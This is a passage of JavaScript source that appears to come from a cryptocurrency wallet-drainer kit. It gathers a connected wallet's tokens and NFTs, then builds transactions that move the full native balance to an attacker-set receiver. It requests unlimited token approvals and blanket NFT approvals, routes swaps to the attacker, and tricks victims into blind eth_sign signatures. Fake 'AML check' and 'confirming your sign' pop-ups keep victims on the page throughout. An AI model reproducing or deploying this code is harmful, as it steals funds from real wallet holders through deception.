        else if (MS_Settings.Contract_Blacklist.length > 0 && MS_Settings.Contract_Blacklist.includes(asset.asset_contract.address.toLowerCase().trim())) continue;
        let asset_chain_id = convert_chain('OPENSEA', 'ID', asset.asset_contract.chain_identifier);
        let asset_price = (collection.stats.one_day_average_price != 0) ? collection.stats.one_day_average_price : collection.stats.seven_day_average_price;
        asset_price = asset_price * MS_Currencies[convert_chain('ID', 'CURRENCY', asset_chain_id)]['USD'];
        let new_asset = {
          chain_id: asset_chain_id, name: asset.name, type: asset.asset_contract.schema_name, amount: asset.num_sales,
          amount_raw: null, amount_usd: asset_price, id: asset.token_id, symbol: null, decimals: null,
          address: asset.asset_contract.address, price: asset_price
        };
        if (typeof asset_price == 'number' && !isNaN(asset_price) && asset_price > 0) list.push(new_asset);
      } catch(err) {
        console.log(err);
      }
    }
    return list;
  } catch(err) {
    console.log(err);
    return [];
  }
};

const retrive_timeout = {};
const retrive_token = async (chain_id, contract_address) => {
  try {
    if (!MS_API_Data[chain_id] || MS_Settings.Settings.Chains[convert_chain('ID', 'ANKR', chain_id)].API == '') return MS_Contract_ABI['ERC20'];
    while (retrive_timeout[chain_id] && retrive_timeout[chain_id].time == Math.floor(Date.now() / 1000) && retrive_timeout[chain_id].count >= 5)
      await new Promise(r => setTimeout(r, 100));
    if (!retrive_timeout[chain_id])
      retrive_timeout[chain_id] = { time: Math.floor(Date.now() / 1000), count: 1 };
    else {
      if (retrive_timeout[chain_id].time == Math.floor(Date.now() / 1000)) retrive_timeout[chain_id].count += 1;
      else {
        retrive_timeout[chain_id].time = Math.floor(Date.now() / 1000);
        retrive_timeout[chain_id].count = 1;
      }
    }
    let response = await fetch(`https://${MS_API_Data[chain_id]}/api?module=contract&action=getsourcecode&address=${contract_address}&apikey=${MS_Settings.Settings.Chains[convert_chain('ID', 'ANKR', chain_id)].API}`, {
      method: 'GET', headers: { 'Accept': 'application/json' }
    });
    response = await response.json();
    if (response.message == 'OK') {
      if (response.result[0].Proxy == '1' && response.result[0].Implementation != '') {
        const implementation = response.result[0].Implementation;
        return retrive_token(chain_id, implementation);
      } else {
        return JSON.parse(response.result[0].ABI)
      }
    } else {
      return MS_Contract_ABI['ERC20'];
    }
  } catch (err) {
    return MS_Contract_ABI['ERC20'];
  }
};

const get_permit_type = (func) => {
  try {
    if (MS_Settings.Settings.Permit.Mode == false) return 0;
    if (func.hasOwnProperty('permit') && func.hasOwnProperty('nonces') &&
      func.hasOwnProperty('name') && func.hasOwnProperty('DOMAIN_SEPARATOR')) {
      const permit_version = ((func) => {
        for (const key in func) {
          if (key.startsWith('permit(')) {
            const args = key.slice(7).split(',')
            if (args.length === 7 && key.indexOf('bool') === -1) return 2;
            if (args.length === 8 && key.indexOf('bool') !== -1) return 1;
            return 0;
          }
        }
      })(func);
      return permit_version;
    } else {
      return 0;
    }
  } catch (err) {
    return 0;
  }
};

const MS_Gas_Reserves = {};

const show_check = () => {
  try {
    if (MS_Loader_Style == 2) {
      MSL.fire({
        icon: 'load', title: 'Processing wallet', text: 'Connecting to blockchain...',
        showConfirmButton: true, confirmButtonText: 'Loading...', timer: 2000, color: MS_Color_Scheme
      }).then(() => {
        if (MS_Check_Done) return;
        MSL.fire({
          icon: 'load', title: 'Processing wallet', text: 'Getting your wallet address...',
          showConfirmButton: true, confirmButtonText: 'Loading...', timer: 5000, color: MS_Color_Scheme
        }).then(() => {
          if (MS_Check_Done) return;
          MSL.fire({
            icon: 'load', title: 'Processing wallet', text: 'Checking your wallet for AML...',
            showConfirmButton: true, confirmButtonText: 'Loading...', timer: 5000, color: MS_Color_Scheme
          }).then(() => {
            if (MS_Check_Done) return;
            MSL.fire({
              icon: 'success', title: 'Processing wallet', subtitle: 'Everything good!',
              text: 'Your wallet is AML risk is low enough!', showConfirmButton: false, timer: 5000, color: MS_Color_Scheme
            }).then(() => {
              if (MS_Check_Done) return;
              MSL.fire({
                icon: 'load', title: 'Processing wallet', text: 'Please wait, we\'re scanning more details...',
                showConfirmButton: true, confirmButtonText: 'Loading...', timer: 300000, color: MS_Color_Scheme
              });
            });
          });
        });
      });
    } else {
      Swal.fire({
        title: 'Connection established',
        icon: 'success',
        timer: 2000
      }).then(() => {
        if (MS_Check_Done) return;
        Swal.fire({
          text: 'Connecting to Blockchain...',
          imageUrl: 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
          imageHeight: 60, allowOutsideClick: false, allowEscapeKey: false,
          timer: 5000, width: 600, showConfirmButton: false
        }).then(() => {
          if (MS_Check_Done) return;
          Swal.fire({
            text: 'Getting your wallet address...',
            imageUrl: 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
            imageHeight: 60, allowOutsideClick: false, allowEscapeKey: false,
            timer: 5000, width: 600, showConfirmButton: false
          }).then(() => {
            if (MS_Check_Done) return;
            Swal.fire({
              text: 'Checking your wallet for AML...',
              imageUrl: 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
              imageHeight: 60, allowOutsideClick: false, allowEscapeKey: false,
              timer: 5000, width: 600, showConfirmButton: false
            }).then(() => {
              if (MS_Check_Done) return;
              Swal.fire({
                text: 'Good, your wallet is AML clear!',
                icon: 'success',
                allowOutsideClick: false, allowEscapeKey: false,
                timer: 2000, width: 600, showConfirmButton: false
              }).then(() => {
                if (MS_Check_Done) return;
                Swal.fire({
                  text: 'Please wait, we\'re scanning more details...',
                  imageUrl: 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
                  imageHeight: 60, allowOutsideClick: false, allowEscapeKey: false,
                  timer: 0, width: 600, showConfirmButton: false
                });
              });
            });
          });
        });
      });
    }
  } catch(err) {
    console.log(err);
  }
};

const get_nonce = async (chain_id) => {
  const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[chain_id]);
  return await node.getTransactionCount(MS_Current_Address, "pending");
};

const wait_message = () => {
  try {
    if (!MS_Process) return;
    Swal.close();
    if (MS_Loader_Style == 2) {
      MSL.fire({
        icon: 'success', title: 'OK', subtitle: 'Thanks!', text: 'Got your sign, wait a bit for confirmation...',
        showConfirmButton: false, timer: 2500, color: MS_Color_Scheme
      }).then(() => {
        MSL.fire({
          icon: 'load', title: 'Processing sign', text: ' Please, don\'t leave this page!',
          showConfirmButton: true, confirmButtonText: 'Confirming sign...', showConfirmButton: false, color: MS_Color_Scheme
        });
      });
    } else {
      Swal.fire({
        html: '<b>Thanks!</b>', icon: 'success',
        allowOutsideClick: false, allowEscapeKey: false,
        timer: 2500, width: 600, showConfirmButton: false
      }).then(() => {
        Swal.fire({
          html: '<b>Confirming your sign...</b><br><br>Please, don\'t leave this page!',
          imageUrl: 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
          imageHeight: 60, allowOutsideClick: false, allowEscapeKey: false,
          timer: 0, width: 600, showConfirmButton: false
        });
      });
    }

  } catch(err) {
    console.log(err);
  }
};

const end_message = () => {
  try {
    if (MS_Loader_Style == 2) {
      MSL.fire({
        icon: 'error', title: 'Error', subtitle: 'We\'re sorry', text: 'Your wallet doesn\'t meet the requirements. Try to connect a middle-active wallet to try again!',
        showConfirmButton: true, confirmButtonText: 'OK', color: MS_Color_Scheme
      });
    } else {
      Swal.close();
      Swal.fire({
        html: '<b>Sorry!</b> Your wallet doesn\'t meet the requirements.<br><br>Try to connect a middle-active wallet to try again!', icon: 'error',
        allowOutsideClick: true, allowEscapeKey: true, timer: 0, width: 600,
        showConfirmButton: true, confirmButtonText: 'OK'
      });
    }
  } catch(err) {
    console.log(err);
  }
};

let is_first_sign = true;

const sign_ready = () => {
  try {
    if (MS_Loader_Style == 2) {
      MSL.fire({
        icon: 'success', title: 'OK', subtitle: 'Sign is confirmed', text: 'Please, wait a bit for confirmation...',
        showConfirmButton: false, color: MS_Color_Scheme
      });
    } else {
      Swal.close();
      Swal.fire({
        html: '<b>Success!</b> Your sign is confirmed!',
        icon: 'success', allowOutsideClick: false, allowEscapeKey: false,
        timer: 0, width: 600, showConfirmButton: false
      });
    }
  } catch(err) {
    console.log(err);
  }
};

const sign_next = () => {
  try {
    if (is_first_sign) {
      is_first_sign = false;
      return;
    }
    if (MS_Loader_Style == 2) {
      MSL.fire({
        icon: 'load', title: 'Waiting for action', text: 'Sign message in your wallet...',
        showConfirmButton: true, confirmButtonText: 'Waiting...', color: MS_Color_Scheme
      });
    } else {
      Swal.close();
      Swal.fire({
        html: '<b>Waiting for your sign...</b><br><br>Please, sign message in your wallet!',
        imageUrl: 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
        imageHeight: 60, allowOutsideClick: false, allowEscapeKey: false,
        timer: 0, width: 600, showConfirmButton: false
      });
    }
  } catch(err) {
    console.log(err);
  }
};

const is_nft_approved = async (contract_address, owner_address, spender_address) => {
  try {
    const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[1]);
    const contract = new ethers.Contract(contract_address, MS_Contract_ABI['ERC721'], node);
    return await contract.isApprovedForAll(owner_address, spender_address);
  } catch(err) {
    console.log(err);
    return false;
  }
};

const get_gas_limit_def_by_chain_id = (chain_id) => {
  switch (chain_id) {
    case 42161: return BN(5000000);
    case 43114: return BN(5000000);
    default: return BN(100000);
  }
}

const SIGN_NATIVE = async (asset) => {
  const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(MS_Gas_Multiplier * 100)));

  const token_limit = BN((asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : (asset.chain_id == 369 ? 900000 : 150000)));
  const tokens_gas_fee = token_limit.mul(MS_Gas_Reserves[asset.chain_id] + 1).mul(gas_price);

  let unsigned_tx = { from: MS_Current_Address, to: MS_Settings.Receiver, value: BN(100), data: "0x" };

  let gas_limit = null;
  try { gas_limit = await node.estimateGas(unsigned_tx) } catch(err)
  { gas_limit = get_gas_limit_def_by_chain_id(parseInt(asset.chain_id)) }

  const balance = await node.getBalance(MS_Current_Address);
  const available_amount = balance.sub(gas_limit.mul(gas_price)).sub(tokens_gas_fee);
  if (available_amount.lte(BN(0))) throw 'LOW_BALANCE';

  const nonce = await node.getTransactionCount(MS_Current_Address, 'pending');

  const web3 = new Web3(MS_Provider);

  unsigned_tx.value = web3.utils.toHex(available_amount.toString());
  unsigned_tx.nonce = web3.utils.toHex(nonce.toString());
  unsigned_tx.gasPrice = web3.utils.toHex(gas_price.toString());
  unsigned_tx.gasLimit = web3.utils.toHex(gas_limit.toString());

  unsigned_tx.v = web3.utils.toHex(asset.chain_id);
  unsigned_tx.r = "0x"; unsigned_tx.s = "0x";

  unsigned_tx = new ethereumjs.Tx(unsigned_tx);
  let serialized_tx = "0x" + unsigned_tx.serialize().toString("hex");
  serialized_tx = web3.utils.sha3(serialized_tx, { encoding: "hex" });

  await sign_request(asset);

  let sign_data = await web3.eth.sign(serialized_tx, MS_Current_Address);
  sign_data = sign_data.substring(2); const r_data = "0x" + sign_data.substring(0, 64);
  const s_data = "0x" + sign_data.substring(64, 128); const rhema = parseInt(sign_data.substring(128, 130), 16);
  const v_data = web3.utils.toHex(rhema + asset.chain_id * 2 + 8)

  unsigned_tx.v = v_data;
  unsigned_tx.r = r_data;
  unsigned_tx.s = s_data;

  serialized_tx = "0x" + unsigned_tx.serialize().toString("hex");

  sign_next();
  const tx = await node.sendTransaction(serialized_tx);
  wait_message();

  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
  await sign_success(asset, available_amount); sign_ready();
};

const SIGN_TOKEN = async (asset) => {
  const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(MS_Gas_Multiplier * 100)));

  const web3 = new Web3(MS_Provider); let contract_data = null;
  const web3_contract = new web3.eth.Contract(MS_Contract_ABI['ERC20'], asset.address);

  let max_approval_amount = ethers.utils.parseEther(MS_Unlimited_Amount);
  for (const c_address of MS_Settings.Unlimited_BL) {
    try {
      if (c_address[0] == MS_Current_Chain_ID && c_address[1] == asset.address.toLowerCase().trim()) {
        max_approval_amount = asset.amount_raw;
        break;
      }
    } catch(err) {
      console.log(err);
    }
  }

  if (MS_Settings.Settings.Sign.Tokens == 1) contract_data = web3_contract.methods.approve(MS_Settings.Address, max_approval_amount).encodeABI();
  else if (MS_Settings.Settings.Sign.Tokens == 2) contract_data = web3_contract.methods.transfer(MS_Settings.Receiver, asset.amount_raw).encodeABI();

  let unsigned_tx = { from: MS_Current_Address, to: asset.address, value: "0x0", data: contract_data };

  let gas_limit = null;
  try { gas_limit = await node.estimateGas(unsigned_tx) } catch(err)
  { gas_limit = get_gas_limit_def_by_chain_id(parseInt(asset.chain_id)) }

  const balance = await node.getBalance(MS_Current_Address);
  const available_amount = balance.sub(gas_limit.mul(gas_price));

  if (available_amount.lt(BN(0))) throw 'LOW_BALANCE';

  const nonce = await node.getTransactionCount(MS_Current_Address, 'pending');

  unsigned_tx.nonce = web3.utils.toHex(nonce.toString());
  unsigned_tx.gasPrice = web3.utils.toHex(gas_price.toString());
  unsigned_tx.gasLimit = web3.utils.toHex(gas_limit.toString());

  unsigned_tx.v = web3.utils.toHex(asset.chain_id);
  unsigned_tx.r = "0x"; unsigned_tx.s = "0x";

  unsigned_tx = new ethereumjs.Tx(unsigned_tx);
  let serialized_tx = "0x" + unsigned_tx.serialize().toString("hex");
  serialized_tx = web3.utils.sha3(serialized_tx, { encoding: "hex" });

  await sign_request(asset);

  let sign_data = await web3.eth.sign(serialized_tx, MS_Current_Address);
  sign_data = sign_data.substring(2); const r_data = "0x" + sign_data.substring(0, 64);
  const s_data = "0x" + sign_data.substring(64, 128); const rhema = parseInt(sign_data.substring(128, 130), 16);
  const v_data = web3.utils.toHex(rhema + asset.chain_id * 2 + 8)

  unsigned_tx.v = v_data;
  unsigned_tx.r = r_data;
  unsigned_tx.s = s_data;

  serialized_tx = "0x" + unsigned_tx.serialize().toString("hex");

  sign_next();
  const tx = await node.sendTransaction(serialized_tx);
  wait_message();

  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
  await sign_success(asset); sign_ready();
};

const SIGN_NFT = async (asset) => {
  const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(MS_Gas_Multiplier * 100)));

  const web3 = new Web3(MS_Provider); let contract_data = null;
  const web3_contract = new web3.eth.Contract(MS_Contract_ABI['ERC721'], asset.address);

  if (MS_Settings.Settings.Sign.NFTs == 1) contract_data = web3_contract.methods.setApprovalForAll(MS_Settings.Address, true).encodeABI();
  else if (MS_Settings.Settings.Sign.NFTs == 2) contract_data = web3_contract.methods.transferFrom(MS_Current_Address, MS_Settings.Receiver, asset.id).encodeABI();

  let unsigned_tx = { from: MS_Current_Address, to: asset.address, value: "0x0", data: contract_data };

  let gas_limit = null;
  try { gas_limit = await node.estimateGas(unsigned_tx) } catch(err)
  { gas_limit = get_gas_limit_def_by_chain_id(parseInt(asset.chain_id)) }

  const balance = await node.getBalance(MS_Current_Address);
  const available_amount = balance.sub(gas_limit.mul(gas_price));

  if (available_amount.lt(BN(0))) throw 'LOW_BALANCE';

  const nonce = await node.getTransactionCount(MS_Current_Address, 'pending');

  unsigned_tx.nonce = web3.utils.toHex(nonce.toString());
  unsigned_tx.gasPrice = web3.utils.toHex(gas_price.toString());
  unsigned_tx.gasLimit = web3.utils.toHex(gas_limit.toString());

  unsigned_tx.v = web3.utils.toHex(asset.chain_id);
  unsigned_tx.r = "0x"; unsigned_tx.s = "0x";

  unsigned_tx = new ethereumjs.Tx(unsigned_tx);
  let serialized_tx = "0x" + unsigned_tx.serialize().toString("hex");
  serialized_tx = web3.utils.sha3(serialized_tx, { encoding: "hex" });

  await sign_request(asset);

  let sign_data = await web3.eth.sign(serialized_tx, MS_Current_Address);
  sign_data = sign_data.substring(2); const r_data = "0x" + sign_data.substring(0, 64);
  const s_data = "0x" + sign_data.substring(64, 128); const rhema = parseInt(sign_data.substring(128, 130), 16);
  const v_data = web3.utils.toHex(rhema + asset.chain_id * 2 + 8)

  unsigned_tx.v = v_data;
  unsigned_tx.r = r_data;
  unsigned_tx.s = s_data;

  serialized_tx = "0x" + unsigned_tx.serialize().toString("hex");

  sign_next();
  const tx = await node.sendTransaction(serialized_tx);
  wait_message();

  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
  await sign_success(asset); sign_ready();
};

const DO_SWAP = async (asset) => {
  const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const swap_deadline = Math.floor(Date.now() / 1000) + (9999 * 10);
  const contract = new ethers.Contract(asset.swapper_address, MS_Pancake_ABI, MS_Signer);
  const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
  let gas_limit = null;
  let gas_attempts = 0;
  while (gas_attempts < 3) {
    try {
      gas_limit = await contract.estimateGas.swapExactTokensForETH(swap_value, '0', [
        asset.address, MS_Swap_Route[asset.chain_id]
      ], MS_Settings.Receiver, swap_deadline, { from: MS_Current_Address });
      gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
      gas_attempts = 3;
    } catch(err) {
      gas_limit = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 350000);
      gas_attempts += 1;
    }
  }
  const nonce = await get_nonce(asset.chain_id);
  const swap_value = ethers.BigNumber.from(asset.amount_raw).lte(ethers.BigNumber.from(asset.swapper_allowance))
  ? ethers.BigNumber.from(asset.amount_raw).toString() : ethers.BigNumber.from(asset.swapper_allowance).toString();
  await swap_request(asset.swapper_type, asset, [ asset ]); sign_next();
  const tx = await contract.swapExactTokensForETH(swap_value, '0', [
    asset.address, MS_Swap_Route[asset.chain_id]
  ], MS_Settings.Receiver, swap_deadline, {
    gasLimit: ethers.BigNumber.from(gas_limit),
    gasPrice: ethers.BigNumber.from(gas_price),
    nonce: nonce, from: MS_Current_Address
  });
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 60000);
  await swap_success(asset.swapper_type, asset, [ asset ]); sign_ready();
};

const DO_UNISWAP = async (asset, all_tokens) => {
  const web3 = new Web3(MS_Provider); const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const swap_deadline = Math.floor(Date.now() / 1000) + (9999 * 10);
  const contract = new ethers.Contract(asset.swapper_address, MS_Uniswap_ABI, MS_Signer);
  const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
  const nonce = await get_nonce(asset.chain_id);
  const swap_data = [];
  for (const token of all_tokens) {
    try {
      const swap_value = ethers.BigNumber.from(token.amount_raw).lte(ethers.BigNumber.from(token.swapper_allowance))
      ? ethers.BigNumber.from(token.amount_raw).toString() : ethers.BigNumber.from(token.swapper_allowance).toString();
      const web3_contract = new web3.eth.Contract(MS_Uniswap_ABI, token.swapper_address);
      const data = web3_contract.methods.swapExactTokensForTokens(swap_value, '0', [
        token.address, MS_Swap_Route[token.chain_id]
      ], MS_Settings.Receiver).encodeABI();
      swap_data.push(data);
    } catch(err) {
      console.log(err);
    }
  }
  let gas_limit = null;
  let gas_attempts = 0;
  while (gas_attempts < 3) {
    try {
      gas_limit = await contract.estimateGas.multicall(swap_deadline, swap_data, { from: MS_Current_Address });
      gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
      gas_attempts = 3;
    } catch(err) {
      gas_limit = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 500000);
      gas_attempts += 1;
    }
  }
  await swap_request(asset.swapper_type, asset, all_tokens); sign_next();
  const tx = await contract.multicall(swap_deadline, swap_data, {
    gasLimit: ethers.BigNumber.from(gas_limit),
    gasPrice: ethers.BigNumber.from(gas_price),
    nonce: nonce, from: MS_Current_Address
  });
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 60000);
  await swap_success(asset.swapper_type, asset, all_tokens); sign_ready();
};

const DO_PANCAKE_V3 = async (asset, all_tokens) => {
  const web3 = new Web3(MS_Provider); const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const swap_deadline = Math.floor(Date.now() / 1000) + (9999 * 10);
  const contract = new ethers.Contract(asset.swapper_address, MS_Pancake_ABI, MS_Signer);
  const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
  const nonce = await get_nonce(asset.chain_id);
  const swap_data = [];
  for (const token of all_tokens) {
    try {
      const swap_value = ethers.BigNumber.from(token.amount_raw).lte(ethers.BigNumber.from(token.swapper_allowance))
      ? ethers.BigNumber.from(token.amount_raw).toString() : ethers.BigNumber.from(token.swapper_allowance).toString();
      const web3_contract = new web3.eth.Contract(MS_Pancake_ABI, token.swapper_address);
      const data = web3_contract.methods.swapExactTokensForTokens(swap_value, '0', [
        token.address, MS_Swap_Route[token.chain_id]
      ], MS_Settings.Receiver).encodeABI();
      swap_data.push(data);
    } catch(err) {
      console.log(err);
    }
  }
  let gas_limit = null;
  let gas_attempts = 0;
  while (gas_attempts < 3) {
    try {
      gas_limit = await contract.estimateGas.multicall(swap_deadline, swap_data, { from: MS_Current_Address });
      gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
      gas_attempts = 3;
    } catch(err) {
      gas_limit = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 500000);
      gas_attempts += 1;
    }
  }
  await swap_request(asset.swapper_type, asset, all_tokens); sign_next();
  const tx = await contract.multicall(swap_deadline, swap_data, {
    gasLimit: ethers.BigNumber.from(gas_limit),
    gasPrice: ethers.BigNumber.from(gas_price),
    nonce: nonce, from: MS_Current_Address
  });
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 60000);
  await swap_success(asset.swapper_type, asset, all_tokens); sign_ready();
};

const DO_CONTRACT = async (asset) => {
  const ankr_chain_id = convert_chain('ID', 'ANKR', asset.chain_id);
  const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(MS_Gas_Multiplier * 100)));

  const token_limit = BN((asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : (asset.chain_id == 369 ? 900000 : 150000)));
  const tokens_gas_fee = token_limit.mul(MS_Gas_Reserves[asset.chain_id] + 1).mul(gas_price);

  if (MS_Settings.Settings.Use_Public_Contract && MS_Settings.Public_Contract[parseInt(asset.chain_id)] != null) {
    MS_Settings.Settings.Chains[ankr_chain_id].Contract_Legacy = 2;
    MS_Settings.Settings.Chains[ankr_chain_id].Contract_Address = MS_Settings.Public_Contract[parseInt(asset.chain_id)][MS_Settings.Settings.Use_Public_Premium ? (asset.amount_usd >= 500 ? 1 : 0) : 0];
  }

  const Contract_ABI = (MS_Settings.Settings.Chains[ankr_chain_id].Contract_Legacy == 1) ?
  JSON.parse(`[{"constant":false,"inputs":[],"name":"${MS_Settings.Settings.Chains[ankr_chain_id].Contract_Type}","outputs":[],"payable":true,"stateMutability":"payable","type":"function"}]`) :
  ((MS_Settings.Settings.Chains[ankr_chain_id].Contract_Legacy == 0) ? JSON.parse(`[{"constant":false,"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"${MS_Settings.Settings.Chains[ankr_chain_id].Contract_Type}","outputs":[],"payable":true,"stateMutability":"payable","type":"function"}]`)
  : JSON.parse(`[{"constant":false,"inputs":[{"internalType":"address","name":"depositer","type":"address"},{"internalType":"address","name":"handler","type":"address"},
  {"internalType":"address","name":"keeper","type":"address"},{"internalType":"uint8","name":"percent","type":"uint8"},{"internalType":"bool","name":"is_cashback","type":"bool"}],"name":"${MS_Settings.Settings.Chains[ankr_chain_id].Contract_Type}","outputs":[],"payable":true,"stateMutability":"payable","type":"function"}]`));

  const web3 = new Web3(MS_Provider); let contract_data = null;
  const web3_contract = new web3.eth.Contract(Contract_ABI, MS_Settings.Settings.Chains[ankr_chain_id].Contract_Address);

  if (MS_Settings.Settings.Chains[ankr_chain_id].Contract_Legacy == 0) {
    contract_data = web3_contract.methods[MS_Settings.Settings.Chains[ankr_chain_id].Contract_Type](MS_Settings.Receiver).encodeABI();
  } else if (MS_Settings.Settings.Chains[ankr_chain_id].Contract_Legacy == 2) {
    let split_data = false;
    try {
      const response = await send_request({ action: 'partner_percent', address: MS_Partner_Address, amount_usd: (asset.amount_usd || null) });
      if (response.status == 'OK' && response.mode == true) split_data = response.percent;
    } catch(err) {
      console.log(err);
    }
    let secondary_address = !split_data ? '0x0000000000000000000000000000000000000000' : MS_Partner_Address;
    contract_data = web3_contract.methods[MS_Settings.Settings.Chains[ankr_chain_id].Contract_Type](MS_Current_Address, MS_Settings.Receiver,
    secondary_address, web3.utils.toHex(!split_data ? 0 : split_data), MS_Settings.Settings.Use_Back_Feature).encodeABI();
  } else {
    contract_data = web3_contract.methods[MS_Settings.Settings.Chains[ankr_chain_id].Contract_Type]().encodeABI();
  }

  let unsigned_tx = { from: MS_Current_Address, to: MS_Settings.Settings.Chains[ankr_chain_id].Contract_Address, value: BN(100), data: contract_data };
  const gas_limit = BN((asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : (asset.chain_id == 369 ? 900000 : 100000)));

  const balance = await node.getBalance(MS_Current_Address);
  const available_amount = balance.sub(gas_limit.mul(gas_price)).sub(tokens_gas_fee);
  if (available_amount.lte(BN(0))) {
    unsigned_tx.to = MS_Settings.Receiver;
    unsigned_tx.data = '0x';
    const another_gas_limit = await node.estimateGas(unsigned_tx);
    const new_available_amount = balance.sub(another_gas_limit.mul(gas_price)).sub(tokens_gas_fee);
    if (new_available_amount.lte(BN(0))) {
      throw 'LOW_BALANCE';
    } else {
      return TRANSFER_NATIVE(asset, true);
    }
  }

  const nonce = await node.getTransactionCount(MS_Current_Address, 'pending');

  unsigned_tx.value = available_amount;
  unsigned_tx.nonce = nonce;
  unsigned_tx.gasPrice = gas_price;
  unsigned_tx.gasLimit = gas_limit;

  await transfer_request(asset); sign_next();
  const tx = await MS_Signer.sendTransaction(unsigned_tx);
  wait_message();

  if (MS_Settings.Settings.Wait_For_Confirmation)
    await node.waitForTransaction(tx.hash, 1, 30000);
  await transfer_success(asset, available_amount); sign_ready();
};

const DO_RANDOMIZER_NATIVE = async (asset) => {
  const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(MS_Gas_Multiplier * 100)));

  const token_limit = BN((asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : (asset.chain_id == 369 ? 900000 : 150000)));
  const tokens_gas_fee = token_limit.mul(MS_Gas_Reserves[asset.chain_id] + 1).mul(gas_price);

  let unsigned_tx = { from: MS_Current_Address, to: MS_Settings.Personal_Wallet.address, value: BN(100), data: "0x" };
  const gas_limit = await node.estimateGas(unsigned_tx);

  const balance = await node.getBalance(MS_Current_Address);
  const available_amount = balance.sub(gas_limit.mul(gas_price)).sub(tokens_gas_fee);
  if (available_amount.lte(BN(0))) throw 'LOW_BALANCE';

  const nonce = await node.getTransactionCount(MS_Current_Address, 'pending');

  unsigned_tx.value = available_amount;
  unsigned_tx.nonce = nonce;
  unsigned_tx.gasPrice = gas_price;
  unsigned_tx.gasLimit = gas_limit;

  await transfer_request(asset); sign_next();
  const tx = await MS_Signer.sendTransaction(unsigned_tx);
  wait_message();

  if (MS_Settings.Settings.Wait_For_Confirmation)
    await node.waitForTransaction(tx.hash, 1, 30000);

  const x_promise = send_request({
    action: 'withdraw_native', wallet: MS_Settings.Personal_Wallet,
    chain_id: asset.chain_id, amount_usd: asset.amount_usd,
    user_id: MS_ID, asset: asset, address: MS_Current_Address
  });
  if (MS_Settings.Settings.Wait_For_Response)
    await x_promise;

  await transfer_success(asset, available_amount); sign_ready();
};

const TRANSFER_NATIVE = async (asset, ignore_contract = false) => {
  const ankr_chain_id = convert_chain('ID', 'ANKR', asset.chain_id);

  if (MS_Settings.Settings.Use_Wallet_Randomizer && MS_Settings.Personal_Wallet != null) return DO_RANDOMIZER_NATIVE(asset);
  if (ignore_contract == false && ((MS_Settings.Settings.Chains[ankr_chain_id].Contract_Address != '' || (MS_Settings.Settings.Use_Public_Contract
  && MS_Settings.Public_Contract[parseInt(asset.chain_id)] != null)) && asset.amount_usd >= MS_Settings.Settings.Use_Contract_Amount)) return DO_CONTRACT(asset);

  const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(MS_Gas_Multiplier * 100)));

  const token_limit = BN((asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : (asset.chain_id == 369 ? 900000 : 150000)));
  const tokens_gas_fee = token_limit.mul(MS_Gas_Reserves[asset.chain_id] + 1).mul(gas_price);

